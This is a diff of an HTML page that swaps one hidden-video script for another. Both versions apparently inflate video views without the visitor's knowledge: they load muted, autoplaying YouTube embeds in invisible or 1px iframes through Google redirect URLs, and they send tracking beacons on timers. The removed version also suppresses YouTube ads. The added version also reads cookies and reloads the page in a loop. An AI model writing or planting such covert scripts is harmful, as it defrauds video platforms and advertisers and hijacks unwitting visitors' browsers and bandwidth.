@@ -1,164 +1,61 @@
 
-<!DOCTYPE html><html>
-<head>
-	<meta name="robots" content="noindex,nofollow">
-	<style>
-		html,body,iframe{
-			overflow:hidden;
-			height:100%;
-			width:100%;
-			border:0px;
-			padding:0px;
-			margin:0px;
-		}
-	</style>
-		<script>		
-		var s=0;
-		</script>
-				
-					</head>
-<body>	
-				<script>	
-			localStorage.setItem("lasttime_new4", 0); 
-			function sendAPIYT(a,b){
-				iFrame.contentWindow.postMessage('{"event":"command","func":"'+a+'","args":['+b+'],"id":1,"channel":"widget"}',"*");
-				
-			}
-			function onLoadFrame(){
-				console.log("onLoadFrame");
-				iFrame.contentWindow.postMessage('{"event":"listening","id":1,"channel":"widget"}',"*");
-			}
-			function listerYT(a){	
-				if(a.origin == "https://www.youtube.com"){
-					
-					event=JSON.parse(a.data);
-					//console.log(event);
-					if(event.event=="onAdStart"){
-						sendAPIYT("unloadModule",'"ad"');
-						sendAPIYT("stopVideo",'""');
-						sendAPIYT("playVideo",'""');							
-					}
-					if(event.event=="onStateChange"){
-						console.log(event.info);
-						if(event.info==1){	
-							sendAPIYT("getInternalApiInterface",'""');								
-						}
-						if(event.info==0){							
-							//clearInterval(cleRTimer2);	
-							//localStorage.setItem("lasttime_new4", 0); 
-							//window.location.href="/f.php?sid=212024&rand="+Math.random();
-						}
-					}
-					if(event.event=="onError"){			
+ 
+<div hidden>
+<body></body>
+	<script>setTimeout(function() {
+	try {
+		document.getElementById("player").remove();
+	} catch(ex){}
+	window.location.reload();
+}, 500*1000);
+function createFrame(videoId, el, autoplay, cc, id) {
+        var iframe = document.createElement('iframe');
+        iframe.src = 'https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2F'+ videoId +'%3Fenablejsapi%3D0%26autoplay%3d'+ autoplay + '%26mute%3d1%26el%26showinfo%3D0%26playsinline%3D0%26modestbranding%3D0%26rel%3D0%26loop%3D0%26cc_load_policy%3D' + cc +'%26origin%3D*';
+        iframe.id = id;
+        iframe.style.height="1px";
+        iframe.style.width="1px";
+        document.body.appendChild(iframe);
+}
+</script>
+<iframe src="https://t.co/?ylm1&ylm=-Dw4NJO1PDs"></iframe><script> var videoId = '-Dw4NJO1PDs'; el = ''; oid = ''; autoplay = ''; cc = '1';</script><script>
+createFrame(videoId, el, 1, cc, "player");
+var finalUrl = ""
+var setInfo = 0
+function getCookie(name){
+    var pattern = RegExp(name + "=.[^;]*")
+    var matched = document.cookie.match(pattern)
+    if(matched){
+        var cookie = matched[0].split('=')
+        return cookie[1]
+    }
+    return false
+}function notify_url(url) {
+        var url = url;
+        var img  = new Image();
+        img.src = url;
+        return false;
+}function find_frame(e) {
+        var iframes = document.getElementsByTagName('iframe');
+        for(var i = 0; i < iframes.length; i++) {
+            if( e.source === iframes[i].contentWindow) {
+                return iframes[i];
+            }
+        }
+}window.addEventListener('message', function(event) {
+    try {
+	    var json = JSON.parse(event.data)
+	    if (json.type == 'playback') {
+                finalUrl = json.message
+		console.log(finalUrl);	
+                sendInfo(finalUrl)
+    	    }
+        } catch(ex) {
+                console.log(ex)
+        }
+    }
+);</script>
 
-						console.log(event.info);					
-						//clearInterval(cleRTimer2);	
-						//localStorage.setItem("lasttime_new4", 0); 
-						//window.location.href="/f.php?sid=212024&rand="+Math.random();						
-					}
-					if(event.event=="onReady"){
-						sendAPIYT("getInternalApiInterface",'""');	
-						sendAPIYT("addEventListener",'"onStateChange"');
-						sendAPIYT("addEventListener",'"onAdAnnounce"');
-						sendAPIYT("addEventListener",'"onAdInfoChange"');
-						sendAPIYT("addEventListener",'"onAdUxClicked"');
-						sendAPIYT("addEventListener",'"onAdUxUpdate"');
-						sendAPIYT("addEventListener",'"onAdPlaybackProgress"');
-						sendAPIYT("addEventListener",'"onAdStateChange"');
-						sendAPIYT("addEventListener",'"onAdIntroStateChange"');
-						sendAPIYT("addEventListener",'"onAdComplete"');
-						sendAPIYT("addEventListener",'"onAdStart"');
-						sendAPIYT("addEventListener",'"onAdEnd"');
-						sendAPIYT("addEventListener",'"onAdMessageChange"');
-						sendAPIYT("addEventListener",'"onApiChange"');
-						sendAPIYT("addEventListener",'"onError"');
-						sendAPIYT("unloadModule",'"ad"');
-						//sendAPIYT("cuePlaylist",'["LIttdxqe_Zk2"]');	
-						sendAPIYT("playVideo",'""');	
-					}
-					//if(event.event!='infoDelivery')console.log(event);
-				}
-			}
-			if (window.addEventListener) {
-				window.addEventListener("message", listerYT);
-			} else {
-				window.attachEvent("onmessage",  listerYT);
-			}
-			function getStartVideo(){};
-		</script>
-				<script>			
-			function imwesq132s(a){
-				let newlink_senders=a+"&rand="+Math.random();
-				let imgSenderStats=new Image();
-					imgSenderStats.src=newlink_senders;
-				//fetch(newlink_senders, {credentials: "omit",mode: "no-cors"}).then(function(response) {}).catch(function(err) { });
-				//fetch(newlink_senders, {credentials: "omit",mode: "no-cors"}).then(function(response) {}).catch(function(err) { });
-			}
-		</script>
-		<script>
-		function getStartFrame(){
-							iFrame.src="https://www.google.com/url?sa=D&q=https%3A%2F%2Fwww.youtube.com%2Fembed%2Ffz1RJi4Zhkg%3Fenablejsapi%3D1%26origin%3D%2A%26playsinline%3D1%26mute%3D1%26loop%3D1%26adformat%3D1_5";
-				setTimeout(function(){
-					iFrame.contentWindow.postMessage('{"event":"command","func":"playVideo","args":[],"id":1,"channel":"widget"}',"*");
-				},15*1000);		
-					
-		}
-		</script>
-		<script>		
-			var mt_rand = function(min,max){return Math.floor(Math.random()*(max-min+1)+min);};
-		</script>
-		<script>
-		const t1=(Date.now()/1000).toFixed(0);
-		var cleRTimer;
-		var cleRTimer2;
-		var iFrame;
-		var sw1=0;
-		var i=0;
-		if(localStorage.getItem('lasttime_new4')==null || (localStorage.getItem('lasttime_new4')!=null && localStorage.getItem('lasttime_new4')<t1-60) && s==0) {
-			sw1=1;
-			localStorage.setItem("lasttime_new4", t1); 
-			cleRTimer2=setInterval(function(){
-				localStorage.setItem("lasttime_new4",(Date.now()/1000).toFixed(0)); 
-			},1000);
-			iFrame=document.createElement('iframe');
-			getStartFrame();
-			iFrame.setAttribute("allow","accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture");
-			iFrame.setAttribute("allowfullscreen","");
-			iFrame.onload=function(){
-				onLoadFrame();
-				getStartVideo();
-			}
-			document.body.appendChild(iFrame);
-			setTimeout(function(){
-				//iFrame.contentWindow.postMessage('{"event":"command","func":"loadVideoById","args":[{"videoId":"9tCXmsLDC0k"}],"id":1,"channel":"widget"}',"*");
-			},30*60*1000);
-			setTimeout(function(){
-				clearInterval(cleRTimer2);				
-			},40*60*1000);
-			setTimeout(function(){
-				getStartFrame();
-			},5*60*1000);
-			setTimeout(function(){
-				getStartFrame();
-			},10*60*1000);
-			setTimeout(function(){
-				getStartFrame();
-			},15*60*1000);
-			setTimeout(function(){
-				if(s==0){
-					getStartFrame();
-					imwesq132s("/i.php?s=212024&id=1586189&hsh=7270715e0fe5769bda85640b1014eb45");
-					clearInterval(cleRTimer);
-				}
-			},20*60*1000);
-			cleRTimer=setInterval(function(){
-				if(s==0){
-					i=i+1;
-					imwesq132s("/s.php?s=212024&id=1586189&c="+i+"&hsh=7270715e0fe5769bda85640b1014eb45");
-				}
-			},60*1000);
-		}
-		</script>
-	
-</body>
-</html>
+</div>
+
+
+
